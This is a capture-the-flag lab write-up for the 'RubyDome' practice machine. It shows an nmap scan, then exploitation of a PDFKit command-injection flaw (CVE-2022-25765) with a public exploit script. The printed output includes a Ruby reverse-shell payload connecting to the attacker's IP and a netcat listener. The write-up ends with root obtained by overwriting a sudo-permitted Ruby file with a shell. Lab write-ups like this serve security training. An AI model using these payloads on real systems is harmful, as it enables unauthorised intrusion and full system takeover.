@@ -1,0 +1,165 @@
+RubyDome — PG PRACTICE(WRITEUP)
+
+    This article provides an overview of a penetration test conducted on the RubyDome Project, specifically focusing on the HTML to PDF converter(PDFKit v 0.8.6). The test identified a vulnerability (CVE-2022–25765) that allowed for an initial foothold. Additionally, a misconfiguration in sudo permissions allowed for adding or altering Ruby files, ultimately resulting in the acquisition of root privileges.
+
+Nmap scan of the Target Server:
+
+┌──(kali㉿kali-linux-2022-2)-[~/offsec/rubydome]
+└─$ nmap -sC -sV 192.168.153.22 -oN rubydome.nmap
+Starting Nmap 7.92 ( <https://nmap.org> ) at 2024-01-02 22:39 IST
+Nmap scan report for 192.168.153.22
+Host is up (0.18s latency).
+Not shown: 998 closed tcp ports (conn-refused)
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   256 b9:bc:8f:01:3f:85:5d:f9:5c:d9:fb:b6:15:a0:1e:74 (ECDSA)
+|_  256 53:d9:7f:3d:22:8a:fd:57:98:fe:6b:1a:4c:ac:79:67 (ED25519)
+3000/tcp open  http    WEBrick httpd 1.7.0 (Ruby 3.0.2 (2021-07-07))
+|_http-server-header: WEBrick/1.7.0 (Ruby/3.0.2/2021-07-07)
+|_http-title: RubyDome HTML to PDF
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+We can see two ports are open here.
+
+    Port 22/tcp: Running OpenSSH 8.9p1, an SSH service, likely for secure remote administration. Two types of SSH host keys (ECDSA and ED25519) are listed.
+    Port 3000/tcp: Running WEBrick HTTP server version 1.7.0 on Ruby 3.0.2, dated 2021–07–07. The HTTP title is “RubyDome HTML to PDF”, suggesting a web service or application that might convert HTML to PDF format.
+
+Opening the port 3000 on browser
+Visiting Port 3000 on Browser
+
+Now entering http://127.0.0.1’ as the url of HTML Page.
+
+The application throws an Error. Which reveals the backend plugin and version.
+
+PDFKIT version 0.8.6
+Error Revealing Plugin PDFKIT-0.8.6
+
+Searching on searchsploit for the Plugin name(PDFKIT), I found there is a RCE exploit for version 0.8.7.2
+Searchsploit to find exploit for PDFKit
+
+I downloaded the exploit using the command “searchsploit -m 51293.py”.
+
+We can see the exploit coded in python. So running with the python3 and added -h for help menu.
+
+┌──(kali㉿kali-linux-2022-2)-[~/offsec/rubydome]
+└─$ python3 51293.py -h
+UNICORD Exploit for CVE-2022–25765 (pdfkit) - Command Injection
+
+Usage:
+  python3 exploit-CVE-2022–25765.py -c <command>
+  python3 exploit-CVE-2022–25765.py -s <local-IP> <local-port>
+  python3 exploit-CVE-2022–25765.py -c <command> [-w <http://target.com/index.html> -p <parameter>]
+  python3 exploit-CVE-2022–25765.py -s <local-IP> <local-port> [-w <http://target.com/index.html> -p <parameter>]
+  python3 exploit-CVE-2022–25765.py -hOptions:
+  -c    Custom command mode. Provide command to generate custom payload with.
+  -s    Reverse shell mode. Provide local IP and port to generate reverse shell payload with.
+  -w    URL of website running vulnerable pdfkit. (Optional)
+  -p    POST parameter on website running vulnerable pdfkit. (Optional)
+  -h    Show this help menu.
+
+If I check the post parameter I found that the parameter is url.
+Inspect Element to find Parameter
+
+Getting reverse shell using this exploit.
+
+┌──(kali㉿kali-linux-2022-2)-[~/offsec/rubydome]
+└─$ python3 51293.py -s 192.168.45.184 80 -w <http://192.168.216.22:3000/pdf> -p url
+
+        _ __,~~~/_        __  ___  _______________  ___  ___
+    ,~~`( )_( )-\\|       / / / / |/ /  _/ ___/ __ \\/ _ \\/ _ \\
+        |/|  `--.       / /_/ /    // // /__/ /_/ / , _/ // /
+_V__v___!_!__!_____V____\\____/_/|_/___/\\___/\\____/_/|_/____/....
+    
+UNICORD: Exploit for CVE-2022–25765 (pdfkit) - Command Injection
+OPTIONS: Reverse Shell Sent to Target Website Mode
+PAYLOAD: http://%20`ruby -rsocket -e'spawn("sh",[:in,:out,:err]=>TCPSocket.new("192.168.45.184","80"))'`
+LOCALIP: 192.168.45.184:80
+WARNING: Be sure to start a local listener on the above IP and port. "nc -lnvp 80".
+WEBSITE: <http://192.168.216.22:3000/pdf>
+POSTARG: url
+EXPLOIT: Payload sent to website!
+SUCCESS: Exploit performed action.
+
+and I got reverse shell in listener as andrew
+
+┌──(kali㉿kali-linux-2022-2)-[~/offsec/rubydome]
+└─$ nc -lnvp 80              
+listening on [any] 80 ...
+connect to [192.168.45.184] from (UNKNOWN) [192.168.216.22] 38564
+id
+uid=1001(andrew) gid=1001(andrew) groups=1001(andrew),27(sudo)
+whoami
+andrew
+
+Got interactive shell using python3 import pty.
+
+which python
+which python3
+/usr/bin/python3
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+andrew@rubydome:~/app$
+
+In /home/andrew I found the local flag.
+
+andrew@rubydome:~$ ls
+ls
+app  local.txt
+andrew@rubydome:~$ pwd     
+pwd
+/home/Andrew
+andrew@rubydome:~$ cat local.txt
+cat local.txt
+<REDUCTED>
+
+Using sudo -l I found that
+
+andrew@rubydome:~/app$ sudo -l        
+sudo -l
+Matching Defaults entries for andrew on rubydome:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin,
+    use_pty
+
+User andrew may run the following commands on rubydome:
+    (ALL) NOPASSWD: /usr/bin/ruby /home/andrew/app/app.rb
+
+We can sudo without password if we are running app.rb file using ruby.
+
+checking GTFO BINS I found that we can get shell using ruby.
+Metrhod from GTFO BINS
+
+So I checked the app.rb file permission.
+
+andrew@rubydome:~/app$ ls -la app.rb
+ls -la app.rb
+-rwxrwx--- 1 andrew andrew 1032 Jan  3 03:42 app.rb
+
+And i found we have write permission to that app.rb file as andrew.
+
+Now I backed up the app.rb to app.rb.bak using cp command.
+
+andrew@rubydome:~/app$ cp app.rb app.rb.bak
+cp app.rb app.rb.bak
+
+Now I added exec “/bin/sh” so i get shell as root.
+
+andrew@rubydome:~/app$ echo 'exec "/bin/sh"'>app.rb
+echo 'exec "/bin/sh"'>app.rb
+andrew@rubydome:~/app$ cat app.rb
+cat app.rb
+exec "/bin/sh"
+
+Now running the file as sudo using ruby I got shell as root.
+
+andrew@rubydome:~/app$ sudo /usr/bin/ruby /home/andrew/app/app.rb
+sudo /usr/bin/ruby /home/andrew/app/app.rb
+# id
+id
+uid=0(root) gid=0(root) groups=0(root)
+# cat /root/proof.txt
+cat /root/proof.txt
+<REDUCTED>
+#
+
+and found the proof flag.
